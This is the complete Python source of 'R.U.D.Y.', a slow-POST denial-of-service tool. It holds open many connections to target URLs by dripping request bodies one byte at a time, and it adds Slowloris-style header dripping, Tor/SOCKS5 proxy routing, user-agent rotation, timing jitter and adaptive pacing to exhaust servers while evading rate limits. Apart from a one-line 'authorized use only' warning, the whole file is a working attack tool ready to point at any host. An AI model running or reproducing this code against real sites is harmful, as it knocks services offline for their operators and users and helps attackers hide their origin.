#OS: Linux based OS's, Windows, macOS
import socket
import ssl
import time
import argparse
import random
import sys
import threading
import string
import signal
import os
import struct
import re
import json
from urllib.parse import urlparse
from datetime import datetime
from datetime import timedelta

class C:
    R="\033[91m"; G="\033[92m"; Y="\033[93m"; B="\033[94m"
    M="\033[95m"; CN="\033[96m"; W="\033[97m"
    BOLD="\033[1m"; DIM="\033[2m"; RST="\033[0m"
    @staticmethod
    def off():
        for a in ['R','G','Y','B','M','CN','W','BOLD','DIM','RST']:
            setattr(C, a, "")

class Log:
    _lock = threading.Lock()
    _file = None
    _json_log = []
    quiet = False

    @classmethod
    def init(cls, path):
        if path: cls._file = open(path, "a", encoding="utf-8")

    @classmethod
    def _w(cls, msg, color="", level="INFO"):
        ts = datetime.now().strftime("%H:%M:%S")
        with cls._lock:
            if not cls.quiet:
                print(f"{C.DIM}[{ts}]{C.RST} {color}{msg}{C.RST}")
            entry = {"time": ts, "level": level, "msg": msg}
            cls._json_log.append(entry)
            if cls._file:
                cls._file.write(json.dumps(entry) + "\n")
                cls._file.flush()

    @classmethod
    def info(cls, m): cls._w(m, C.CN, "INFO")
    @classmethod
    def ok(cls, m): cls._w(m, C.G, "OK")
    @classmethod
    def warn(cls, m): cls._w(m, C.Y, "WARN")
    @classmethod
    def err(cls, m): cls._w(m, C.R, "ERROR")
    @classmethod
    def atk(cls, m): cls._w(m, C.M, "ATTACK")

    @classmethod
    def dump_report(cls, path):
        with open(path, "w", encoding="utf-8") as f:
            json.dump(cls._json_log, f, indent=2)

def parse_size(s):
    m = re.match(r'^(\d+(?:\.\d+)?)\s*(B|KB|MB|GB|TB)?$', s.strip().upper())
    if not m: raise ValueError(f"Invalid size: {s}")
    num = float(m.group(1))
    unit = m.group(2) or 'B'
    mult = {'B':1,'KB':1024,'MB':1024**2,'GB':1024**3,'TB':1024**4}
    return int(num * mult[unit])

def fmt_bytes(b):
    if b >= 1024**3: return f"{b/1024**3:.2f} GB"
    if b >= 1024**2: return f"{b/1024**2:.2f} MB"
    if b >= 1024: return f"{b/1024:.2f} KB"
    return f"{b} B"

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/124.0.0.0",
]

class Stats:
    def __init__(self):
        self._lk = threading.Lock()
        self.bytes = 0; self.conns = 0; self.active = 0
        self.fails = 0; self.recons = 0; self.reqs = 0
        self.t0 = time.time()
        self.status_codes = {}

    def add_bytes(self, n):
        with self._lk: self.bytes += n
    def conn_open(self):
        with self._lk: self.conns += 1; self.active += 1
    def conn_close(self):
        with self._lk: self.active = max(0, self.active - 1)
    def conn_fail(self):
        with self._lk: self.fails += 1
    def conn_recon(self):
        with self._lk: self.recons += 1
    def req_sent(self):
        with self._lk: self.reqs += 1
    def add_status(self, code):
        with self._lk:
            self.status_codes[code] = self.status_codes.get(code, 0) + 1

    def snap(self):
        with self._lk:
            e = time.time() - self.t0
            return dict(elapsed=e, bytes=self.bytes, conns=self.conns,
                        active=self.active, fails=self.fails,
                        recons=self.recons, reqs=self.reqs,
                        bps=self.bytes/e if e>0 else 0,
                        status_codes=dict(self.status_codes))

def chunk_enc(data):
    return f"{len(data):x}\r\n".encode() + data + b"\r\n"

def chunk_end():
    return b"0\r\n\r\n"

def socks5_connect(ph, pp, dh, dp):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(30)
    sock.connect((ph, pp))
    sock.sendall(b'\x05\x01\x00')
    resp = sock.recv(2)
    if resp[0] != 0x05 or resp[1] != 0x00:
        raise ConnectionError("SOCKS5 auth failed")
    addr = dh.encode()
    req = b'\x05\x01\x00\x03' + bytes([len(addr)]) + addr + struct.pack('!H', dp)
    sock.sendall(req)
    resp = sock.recv(10)
    if resp[1] != 0x00:
        raise ConnectionError(f"SOCKS5 connect failed (code {resp[1]})")
    return sock

def parse_proxy(s):
    if not s: return None
    s = s.strip()
    if s.startswith("socks5://"):
        h, p = s[len("socks5://"):].rsplit(":", 1)
        return ("socks5", h, int(p))
    if s.startswith("http://"):
        h, p = s[len("http://"):].rsplit(":", 1)
        return ("http", h, int(p))
    h, p = s.rsplit(":", 1)
    return ("http", h, int(p))

def load_targets(url=None, url_file=None):
    """Load target URLs from CLI arg or file. Returns list of (host, port, path, ssl)."""
    urls = []
    if url_file and os.path.isfile(url_file):
        with open(url_file, "r") as f:
            urls = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    if url:
        urls.append(url)
    targets = []
    for u in urls:
        p = urlparse(u)
        if not p.hostname: continue
        targets.append({
            "host": p.hostname,
            "port": p.port or (443 if p.scheme == 'https' else 80),
            "path": p.path or '/',
            "ssl": p.scheme == 'https',
            "url": u,
        })
    return targets

class RUDYConn:
    def __init__(self, cid, target, payload, interval, jitter,
                 stats, stop, proxy, chunk_min, chunk_max, drip_headers, adaptive, custom_headers=None):
        self.cid = cid
        self.host = target["host"]; self.port = target["port"]
        self.path = target["path"]; self.use_ssl = target["ssl"]
        self.payload = payload
        self.base_interval = interval; self.interval = interval
        self.jitter = jitter; self.stats = stats; self.stop = stop
        self.proxy = proxy; self.chunk_min = chunk_min
        self.chunk_max = chunk_max; self.drip_headers = drip_headers
        self.adaptive = adaptive; self.custom_headers = custom_headers or []; self.sock = None

    def _connect(self):
        if self.proxy:
            pt, ph, pp = self.proxy
            if pt == "socks5":
                sock = socks5_connect(ph, pp, self.host, self.port)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30)
                sock.connect((ph, pp))
                tun = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n\r\n"
                sock.sendall(tun.encode())
                r = sock.recv(4096).decode(errors="ignore")
                if "200" not in r:
                    raise ConnectionError(f"Proxy tunnel failed: {r.strip()}")
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((self.host, self.port))

        if self.use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=self.host)
        return sock

    def _build_headers(self):
        ua = random.choice(UA_LIST)
        content_length = len(self.payload)
        hdr = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: */*\r\n"
            f"Content-Length: {content_length}\r\n"
            f"Connection: keep-alive\r\n"
        )
        for ch in self.custom_headers:
            hdr += f"{ch}\r\n"
        hdr += "\r\n"
        return hdr

    def _send_headers_slow(self):
        ua = random.choice(UA_LIST)
        content_length = len(self.payload)
        lines = [
            f"POST {self.path} HTTP/1.1\r\n",
            f"Host: {self.host}\r\n",
            f"User-Agent: {ua}\r\n",
            f"Accept: */*\r\n",
            f"Content-Length: {content_length}\r\n",
            f"Connection: keep-alive\r\n",
        ]
        for ch in self.custom_headers:
            lines.append(f"{ch}\r\n")
        lines.append("\r\n")
        for line in lines:
            if self.stop.is_set(): return False
            try:
                self.sock.sendall(line.encode())
            except OSError:
                return False
            delay = random.uniform(self.interval * 0.3, self.interval * 0.7)
            end = time.time() + delay
            while time.time() < end and not self.stop.is_set():
                time.sleep(0.1)
        return True

    def _drip_body(self):
        idx = 0; total = len(self.payload)

        try:
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        except OSError:
            pass

        while not self.stop.is_set():
            if idx < total:
                cs = random.randint(self.chunk_min, self.chunk_max)
                cs = min(cs, total - idx)
                data = self.payload[idx:idx+cs]
                try:
                    self.sock.sendall(data)
                except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError):
                    return False
                idx += cs
                self.stats.add_bytes(cs)

            delay = self.interval + random.uniform(-self.jitter, self.jitter)
            delay = max(0.5, delay)
            end = time.time() + delay

            while time.time() < end and not self.stop.is_set():
                time.sleep(0.5)
                try:
                    self.sock.setblocking(False)
                    data = self.sock.recv(1)
                    self.sock.setblocking(True)
                    if data == b"":
                        return False
                except BlockingIOError:
                    self.sock.setblocking(True)
                    pass
                except OSError:
                    self.sock.setblocking(True)
                    return False

        return True

    def _read_response(self):
        """Read server response after chunked body is complete."""
        try:
            self.sock.settimeout(5)
            resp = self.sock.recv(4096).decode(errors="ignore")
            if resp:
                m = re.match(r'HTTP/\d\.\d\s+(\d+)', resp)
                if m:
                    code = int(m.group(1))
                    self.stats.add_status(code)
                    Log.info(f"[#{self.cid}] Response: {code}")
                    if self.adaptive and code in (429, 503):
                        self.interval = min(self.interval * 2, 60)
                        Log.warn(f"[#{self.cid}] {code} received, interval -> {self.interval:.1f}s")
                    elif self.adaptive and code == 200:
                        self.interval = max(self.base_interval, self.interval * 0.8)
        except (socket.timeout, OSError):
            pass

    def run(self, max_retries=5):
        retries = 0
        while not self.stop.is_set() and retries < max_retries:
            try:
                self.sock = self._connect()
                self.stats.conn_open()
                if retries > 0:
                    self.stats.conn_recon()
                    Log.warn(f"[#{self.cid}] Reconnected (attempt {retries+1})")
                else:
                    Log.ok(f"[#{self.cid}] Connected {self.host}:{self.port}")

                if self.drip_headers:
                    Log.atk(f"[#{self.cid}] Slowloris mode: dripping headers...")
                    if not self._send_headers_slow():
                        retries += 1; continue
                else:
                    hdr = self._build_headers()
                    self.sock.sendall(hdr.encode())

                self.stats.req_sent()
                Log.atk(f"[#{self.cid}] Holding connection | Body: {fmt_bytes(len(self.payload))} declared | 1 byte/{self.interval}s")

                self._drip_body()

                if not self.stop.is_set():
                    Log.warn(f"[#{self.cid}] Server closed connection, reconnecting...")
                    retries = 0

            except (ConnectionRefusedError, OSError) as e:
                retries += 1; self.stats.conn_fail()
                Log.err(f"[#{self.cid}] Failed: {e}")
                if retries < max_retries and not self.stop.is_set():
                    bt = min(2**retries + random.random(), 30)
                    Log.warn(f"[#{self.cid}] Retry in {bt:.1f}s...")
                    end = time.time() + bt
                    while time.time() < end and not self.stop.is_set():
                        time.sleep(0.2)
            except Exception as e:
                retries += 1; self.stats.conn_fail()
                Log.err(f"[#{self.cid}] Error: {e}")
            finally:
                if self.sock:
                    try: self.sock.close()
                    except: pass
                self.stats.conn_close()

        if retries >= max_retries:
            Log.err(f"[#{self.cid}] Max retries. Exiting.")

def dashboard(stats, stop, iv=5):
    first = True
    while not stop.is_set():
        time.sleep(iv)
        if stop.is_set(): break
        s = stats.snap()
        el = str(timedelta(seconds=int(s["elapsed"])))
        sc = ", ".join(f"{k}:{v}" for k,v in sorted(s["status_codes"].items())) or "none"
        
        up = "\n" if first else "\033[13A\r"
        first = False
        
        print(
            f"{up}\033[K{C.BOLD}{C.B}{'='*55}{C.RST}\n"
            f"\033[K  {C.BOLD}{C.W}R.U.D.Y. Live Stats{C.RST}\n"
            f"\033[K{C.B}{'-'*55}{C.RST}\n"
            f"\033[K  {C.CN}Elapsed     {C.RST}| {el}\n"
            f"\033[K  {C.G}Active      {C.RST}| {s['active']}\n"
            f"\033[K  {C.W}Total Conns {C.RST}| {s['conns']}\n"
            f"\033[K  {C.R}Failed      {C.RST}| {s['fails']}\n"
            f"\033[K  {C.Y}Reconnects  {C.RST}| {s['recons']}\n"
            f"\033[K  {C.M}Requests    {C.RST}| {s['reqs']}\n"
            f"\033[K  {C.CN}Data Sent   {C.RST}| {fmt_bytes(s['bytes'])}\n"
            f"\033[K  {C.W}Avg Rate    {C.RST}| {fmt_bytes(s['bps'])}/s\n"
            f"\033[K  {C.Y}Responses   {C.RST}| {sc}\n"
            f"\033[K{C.BOLD}{C.B}{'='*55}{C.RST}\n"
            f"\033[K  {C.DIM}Press Ctrl+C to stop{C.RST}", end="", flush=True)
    print()

def banner():
    print(rf"""
{C.R}{C.BOLD}
                         ;                                     
                         ED.                                   
                :        E#Wi                                  
  j.            Ef       E###G.                           ⠀⠀⠀⠀⢀⣀⣤⣤⣤⣤⣄⡀⠀⠀⠀⠀
  EW,           E#t      E#fD#W;       f.     ;WE.        ⠀⢀⣤⣾⣿⣾⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀
  E##j          E#t      E#t t##L      E#,   i#G          ⢠⣾⣿⢛⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀
  E###D.        E#t      E#t  .E#K,    E#t  f#f           ⣾⣯⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧
  E#jG#W;       E#t fi   E#t    j##f   E#t G#i            ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
  E#t t##f      E#t L#j  E#t    :E#K:  E#jEW,             ⣿⡿⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠻⢿⡵
  E#t  :K#E:    E#t L#L  E#t   t##L    E##E.              ⢸⡇⠀⠀⠉⠛⠛⣿⣿⠛⠛⠉⠀⠀⣿⡇
  E#KDDDD###i   E#tf#E:  E#t .D#W;     E#G                ⢸⣿⣀⠀⢀⣠⣴⡇⠹⣦⣄⡀⠀⣠⣿⡇
  E#f,t#Wi,,,   E###f    E#tiW#G.      E#t                ⠈⠻⠿⠿⣟⣿⣿⣦⣤⣼⣿⣿⠿⠿⠟⠀
  E#t  ;#W:     E#K,     E#K##i        E#t                ⠀⠀⠀⠀⠸⡿⣿⣿⢿⡿⢿⠇⠀⠀⠀⠀
  DWi   ,KK: .j EL    .j E##D.      .j EE.                ⠀⠀⠀⠀⠀⠀⠈⠁⠈⠁⠀⠀⠀⠀⠀⠀
             ;f.:     ;f.E#t        ;f.t                       
                         L:                                    
  {C.DIM}R-U-Dead-Yet? | Advanced Slow POST Tool{C.RST}
  {C.DIM}   https://github.com/rafosw/rudy{C.RST}
""")

def main():
    if sys.stdout.encoding.lower() != 'utf-8':
        try:
            sys.stdout.reconfigure(encoding='utf-8')
        except AttributeError:
            pass

    parser = argparse.ArgumentParser(
        description="R.U.D.Y. Advanced Slow POST Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python rudy.py -u http://target.com/login
  python rudy.py -u http://target.com -c 50 -p 5MB -i 5
  python rudy.py --url-file targets.txt -c 20
  python rudy.py -u http://target.com -t socks5://127.0.0.1:9050
  python rudy.py -u http://target.com --drip-headers --adaptive
        """)
    parser.add_argument("-u", "--url", help="Target URL")
    parser.add_argument("--url-file", default=None,
                        help="File with target URLs (one per line)")
    parser.add_argument("-c", "--concurrents", type=int, default=1,
                        help="Concurrent connections (default: 1)")
    parser.add_argument("-f", "--filepath", default=None,
                        help="Payload file path (default: random)")
    parser.add_argument("-d", "--data", default=None,
                        help="Custom POST data (e.g. 'log=admin&pwd=123')")
    parser.add_argument("-H", "--header", action="append", default=[],
                        help="Custom header (e.g. 'Cookie: test=1')")
    parser.add_argument("-i", "--interval", type=float, default=10.0,
                        help="Seconds between each chunk (default: 10)")
    parser.add_argument("-p", "--payload-size", default="1MB",
                        help="Random payload size (default: 1MB)")
    parser.add_argument("-t", "--tor", default=None,
                        help="TOR/SOCKS5 endpoint (socks5://host:port)")
    parser.add_argument("--proxy", default=None,
                        help="HTTP proxy (http://host:port or host:port)")
    parser.add_argument("-j", "--jitter", type=float, default=1.0,
                        help="Timing jitter in seconds, capped at 30%% of interval (default: 1.0)")
    parser.add_argument("--retries", type=int, default=5,
                        help="Max retries per thread (default: 5)")
    parser.add_argument("--chunk-min", type=int, default=1,
                        help="Min bytes per chunk (default: 1)")
    parser.add_argument("--chunk-max", type=int, default=1,
                        help="Max bytes per chunk (default: 1)")
    parser.add_argument("--drip-headers", action="store_true",
                        help="Slowloris-style: drip headers line by line")
    parser.add_argument("--adaptive", action="store_true",
                        help="Adaptive interval: slow down on 429/503, speed up on 200")
    parser.add_argument("--log", default=None, help="JSON log file path")
    parser.add_argument("--report", default=None,
                        help="Save JSON summary report on exit")
    parser.add_argument("--no-color", action="store_true", help="Disable colors")
    parser.add_argument("--stats-iv", type=int, default=5,
                        help="Dashboard refresh interval (default: 5s)")
    if "--no-color" in sys.argv or not sys.stdout.isatty():
        C.off()

    banner()
    args = parser.parse_args()

    Log.init(args.log)

    targets = load_targets(url=args.url, url_file=args.url_file)
    if not targets:
        Log.err("No valid target URL provided. Use -u or --url-file.")
        sys.exit(1)

    payload_size = parse_size(args.payload_size)
    if args.filepath:
        if not os.path.isfile(args.filepath):
            Log.err(f"File not found: {args.filepath}"); sys.exit(1)
        with open(args.filepath, "rb") as f:
            payload = f.read()
        Log.info(f"Payload from file: {args.filepath} ({fmt_bytes(len(payload))})")
    elif args.data:
        custom_bytes = args.data.encode()
        pad_size = max(0, payload_size - len(custom_bytes))
        payload = custom_bytes + bytes(random.getrandbits(8) for _ in range(pad_size))
        Log.info(f"Custom data payload + padding: {fmt_bytes(len(payload))}")
    else:
        payload = bytes(random.getrandbits(8) for _ in range(payload_size))
        Log.info(f"Random payload: {fmt_bytes(len(payload))}")

    proxy = parse_proxy(args.tor or args.proxy)
    jitter = max(0.0, min(args.interval * 0.3, args.jitter))

    Log.info(f"Targets    : {len(targets)} URL(s)")
    for t in targets:
        Log.info(f"  -> {t['url']}")
    Log.info(f"Concurrent : {args.concurrents}")
    Log.info(f"Interval   : {args.interval}s (jitter: +/-{jitter:.2f}s, max 30% of interval)")
    Log.info(f"Chunk size : {args.chunk_min}-{args.chunk_max} bytes")
    Log.info(f"Encoding   : Chunked Transfer-Encoding")
    if args.drip_headers:
        Log.info(f"Header drip: ENABLED (Slowloris-style)")
    if args.adaptive:
        Log.info(f"Adaptive   : ENABLED (backs off on 429/503)")
    if proxy:
        Log.info(f"Proxy      : {proxy[0]}://{proxy[1]}:{proxy[2]}")
    print()
    Log.warn("WARNING: Only use on systems you own or have authorization to test.\n")

    stop = threading.Event()
    stats = Stats()

    def sig_handler(sig, frame):
        Log.warn("\nShutting down...")
        stop.set()

    signal.signal(signal.SIGINT, sig_handler)
    if hasattr(signal, "SIGBREAK"):
        signal.signal(signal.SIGBREAK, sig_handler)

    dt = threading.Thread(target=dashboard, args=(stats, stop, args.stats_iv), daemon=True)
    dt.start()

    Log.quiet = True

    threads = []
    if not Log.quiet: Log.info(f"Launching {args.concurrents} connections...\n")
    for i in range(args.concurrents):
        target = targets[i % len(targets)]
        conn = RUDYConn(
            cid=i+1, target=target, payload=payload,
            interval=args.interval, jitter=jitter,
            stats=stats, stop=stop, proxy=proxy,
            chunk_min=args.chunk_min, chunk_max=args.chunk_max,
            drip_headers=args.drip_headers, adaptive=args.adaptive,
            custom_headers=args.header,
        )
        t = threading.Thread(target=conn.run, args=(args.retries,), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(random.uniform(0.05, 0.15))

    try:
        while not stop.is_set():
            if not any(t.is_alive() for t in threads):
                Log.info("All threads finished."); break
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop.set()

    stop.set()
    for t in threads:
        t.join(timeout=5)

    s = stats.snap()
    el = str(timedelta(seconds=int(s["elapsed"])))
    sc = ", ".join(f"{k}:{v}" for k,v in sorted(s["status_codes"].items())) or "none"

    print(f"\n{C.BOLD}{C.R}{'='*55}{C.RST}")
    print(f"  {C.BOLD}Attack Summary{C.RST}")
    print(f"{C.R}{'-'*55}{C.RST}")
    print(f"  Duration      : {el}")
    print(f"  Connections   : {s['conns']} (failed: {s['fails']})")
    print(f"  Reconnections : {s['recons']}")
    print(f"  Requests      : {s['reqs']}")
    print(f"  Data Sent     : {fmt_bytes(s['bytes'])}")
    print(f"  Avg Rate      : {fmt_bytes(s['bps'])}/s")
    print(f"  Responses     : {sc}")
    print(f"{C.BOLD}{C.R}{'='*55}{C.RST}\n")

    if args.report:
        report = {
            "timestamp": datetime.now().isoformat(),
            "targets": [t["url"] for t in targets],
            "duration_sec": s["elapsed"],
            "total_connections": s["conns"],
            "failed_connections": s["fails"],
            "reconnections": s["recons"],
            "requests_sent": s["reqs"],
            "bytes_sent": s["bytes"],
            "avg_bps": s["bps"],
            "status_codes": s["status_codes"],
            "config": {
                "concurrents": args.concurrents,
                "interval": args.interval,
                "jitter": jitter,
                "chunk_min": args.chunk_min,
                "chunk_max": args.chunk_max,
                "drip_headers": args.drip_headers,
                "adaptive": args.adaptive,
            }
        }
        with open(args.report, "w") as f:
            json.dump(report, f, indent=2)
        Log.quiet = False
        Log.info(f"Report saved: {args.report}")
        Log.quiet = True

    Log.quiet = False
    Log.info("Attack finished.")
    if Log._file: Log._file.close()

if __name__ == "__main__":
    main()
